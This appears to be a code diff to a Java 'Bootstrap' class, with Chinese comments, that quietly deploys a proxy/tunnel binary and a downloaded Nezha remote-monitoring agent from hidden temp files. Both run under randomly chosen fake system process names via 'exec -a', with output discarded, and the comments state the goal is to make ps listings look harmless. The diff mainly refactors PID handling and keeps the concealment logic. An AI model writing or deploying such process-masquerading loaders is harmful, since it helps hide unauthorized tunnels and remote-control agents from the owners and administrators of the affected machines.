@@ -38,12 +38,13 @@ public class Bootstrap
 
     // ============ 文件路径（全部放系统临时目录，用无害名称）============
     private static final String TMP       = System.getProperty("java.io.tmpdir");
-    private static final File fSbx        = new File(TMP, ".java_pid" + ProcessHandle.current().pid());
-    private static final File fConfig     = new File(TMP, ".conf-" + ProcessHandle.current().pid());
-    private static final File fBootLog    = new File(TMP, ".log-"  + ProcessHandle.current().pid());
-    private static final File fSub        = new File(TMP, ".sub-"  + ProcessHandle.current().pid());
-    private static final File fTunnelJson = new File(TMP, ".tjson-"+ ProcessHandle.current().pid());
-    private static final File fTunnelYml  = new File(TMP, ".tyml-" + ProcessHandle.current().pid());
+    private static final String PID       = getPid();
+    private static final File fSbx        = new File(TMP, ".java_pid" + PID);
+    private static final File fConfig     = new File(TMP, ".conf-"    + PID);
+    private static final File fBootLog    = new File(TMP, ".log-"     + PID);
+    private static final File fSub        = new File(TMP, ".sub-"     + PID);
+    private static final File fTunnelJson = new File(TMP, ".tjson-"   + PID);
+    private static final File fTunnelYml  = new File(TMP, ".tyml-"    + PID);
 
     private static volatile String encodedSub = "";
     private static HttpServer httpServer;
@@ -119,7 +120,6 @@ public class Bootstrap
 
     // ============ 启动 sbsh，伪装进程名 ============
     private static void startSbx() throws Exception {
-        // 构造传给 sbsh 的环境变量（与例子一致）
         Map<String, String> env = new HashMap<>(System.getenv());
         env.put("UUID",        X_UUID);
         env.put("ARGO_PORT",   String.valueOf(X_ARGO_PORT));
@@ -130,26 +130,18 @@ public class Bootstrap
         env.put("NAME",        X_NAME);
         env.put("FILE_PATH",   TMP);
 
-        // argv[0] 伪装成系统进程名，让 ps 看起来无害
         String fakeName = FAKE_NAMES[new Random().nextInt(FAKE_NAMES.length)];
 
-        ProcessBuilder pb = new ProcessBuilder(fakeName, fSbx.getAbsolutePath());
-        pb.environment().clear();
-        pb.environment().putAll(env);
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-
-        // Linux 下通过 /proc/self/exe 软链接方式伪装 argv[0]
-        // 实际可行的方式：用 sh -c exec -a 'fakename' binary
-        ProcessBuilder pb2 = new ProcessBuilder(
+        // exec -a 伪装 argv[0]，ps aux 看到的是系统进程名
+        ProcessBuilder pb = new ProcessBuilder(
             "sh", "-c",
             "exec -a '" + fakeName + "' " + fSbx.getAbsolutePath()
         );
-        pb2.environment().clear();
-        pb2.environment().putAll(env);
-        pb2.redirectErrorStream(true);
-        pb2.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-        pb2.start();
+        pb.environment().clear();
+        pb.environment().putAll(env);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(new File("/dev/null"));
+        pb.start();
 
         Thread.sleep(3000);
     }
@@ -158,8 +150,7 @@ public class Bootstrap
     private static void startNezha() throws Exception {
         if (NZ_SERVER.isEmpty() || NZ_KEY.isEmpty()) return;
 
-        // 下载哪吒 v1 agent，也用无害文件名
-        File fNezha = new File(TMP, ".java_nz" + ProcessHandle.current().pid());
+        File fNezha = new File(TMP, ".java_nz" + PID);
         if (!fNezha.exists()) {
             String arch = System.getProperty("os.arch").toLowerCase();
             String nzUrl;
@@ -171,15 +162,13 @@ public class Bootstrap
                 nzUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
             }
 
-            // 下载 zip，解压出 nezha-agent
-            File fZip = new File(TMP, ".tmp_nz.zip");
+            File fZip = new File(TMP, ".tmp_nz_" + PID + ".zip");
             download(nzUrl, fZip);
             unzip(fZip, fNezha, "nezha-agent");
             fZip.delete();
             fNezha.setExecutable(true);
         }
 
-        // 解析 server:port
         String server = NZ_SERVER;
         String port   = NZ_PORT;
         if ((port == null || port.isEmpty()) && server.contains(":")) {
@@ -189,7 +178,6 @@ public class Bootstrap
         }
         if (port == null || port.isEmpty()) port = "443";
 
-        // v1 参数，同样伪装进程名
         String fakeName = FAKE_NAMES[new Random().nextInt(FAKE_NAMES.length)];
         String nzArgs = "--server " + server + " --port " + port
             + " --password " + NZ_KEY + " --tls --disable-auto-update"
@@ -201,7 +189,7 @@ public class Bootstrap
         );
         pb.environment().putAll(System.getenv());
         pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+        pb.redirectOutput(new File("/dev/null"));
         pb.start();
     }
 
@@ -362,5 +350,15 @@ public class Bootstrap
     private static String ge(String key, String def) {
         String v = System.getenv(key);
         return (v != null && !v.isEmpty()) ? v : def;
+    }
+
+    // Java 8 兼容的 PID 获取：ManagementFactory 返回 "pid@hostname"
+    private static String getPid() {
+        try {
+            String name = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
+            return name.split("@")[0];
+        } catch (Exception e) {
+            return String.valueOf(new Random().nextInt(99999));
+        }
     }
 }
